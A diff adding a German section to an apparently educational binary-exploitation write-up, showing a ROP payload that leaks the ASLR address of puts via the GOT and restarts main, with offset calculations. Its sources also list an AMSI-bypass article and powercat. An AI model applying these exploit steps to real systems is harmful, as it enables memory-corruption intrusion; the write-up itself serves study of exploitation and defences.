@@ -610,6 +610,51 @@ entgegennehmen kann. Zwischen diesen Aufrufen muss der Leak stattfinden.
 Dies muss in einem durchgehenden Prozessablauf stattfinden, da beim Erstellen
 eines neuen Prozesses auch ein neuer Offset generiert wird! (siehe `ldd` Code Snippet)
 
+Das zweite Payload muss variabel gestaltbar sein. Hierzu wird
+[pwntools](https://github.com/Gallopsled/pwntools) verwendet um programmatisch
+mit dem `bin` Prozess interagieren zu können. (`stdin`/`stdout`)
+
+Im ersten Schritt wurde der Adress-Leak provoziert (payload1):
+
+```sh
+payload1 = (
+    buffer  # padding.
+    + backup_base_pointer  # padding.
+    + rop_pop_rdi_ret  # pops puts_got.
+    + puts_got  # points to address affected by aslr.
+    + rop_puts  # outputs address that puts_got points to.
+)
+```
+
+* `rop_pop_rdi_ret` lädt die Adresse, auf die `puts_got` zeigt in das `rdi` Register
+  * `puts_got` wurde via `gef➤  got` identifiziert
+  * `puts_got` zeigt auf die eigentliche Funktion (ASLR-Abhängige Position)
+* `rop_puts` gibt diese dann über `stdout` aus
+* durch starten des Payloads ohne ASLR erhalten wir die Adresse: `0x7ffff7e4be10`
+  * dies entspricht unserem vorherigen Aufruf von `gef➤  got`, wir erhalten also tatsächlich eine brauchbare Adresse
+  * Puts-Leak `0x7ffff7e4be10` minus libc-Start `0x7ffff7dd6000` ergibt einen Wert von `0x75e10` (`offset_to_libc`)
+  * mit diesen Werten können wir nun den Offset berechnen bei aktiviertem ASLR berechnen
+* bevor wir das zweite Payload schicken können, muss noch ein weiterer `scanf()` aufruf
+ausgelöst werden
+  * hierzu wird hinter `rop_puts` die Adresse von `main+0` auf den Stack gelegt:
+
+```sh
+# this payload leaks the ASLR address of puts and restarts main:
+payload1 = (
+    buffer  # padding.
+    + backup_base_pointer  # padding.
+    + rop_pop_rdi_ret  # pops puts_got.
+    + puts_got  # points to address affected by aslr.
+    + rop_puts  # outputs address that puts_got points to.
+    + main_line0  # restarts app for second payload.
+)
+```
+
+* beim Verwenden dieses Payloads wird tatsächlich nach dem Leak wieder eine
+Eingabeaufforderung gestartet (da die `main()` von Vorne beginnt):
+
+![image](https://user-images.githubusercontent.com/173962/155961102-93485b9b-a2a0-48e0-83a5-fb75a79e6b04.png)
+
 # Quellen
 
 * https://github.com/bmedicke/REED
@@ -618,3 +663,4 @@ eines neuen Prozesses auch ein neuer Offset generiert wird! (siehe `ldd` Code Sn
 * https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/
 * https://github.com/besimorhino/powercat
 * https://github.com/hugsy/gef
+* https://github.com/Gallopsled/pwntools
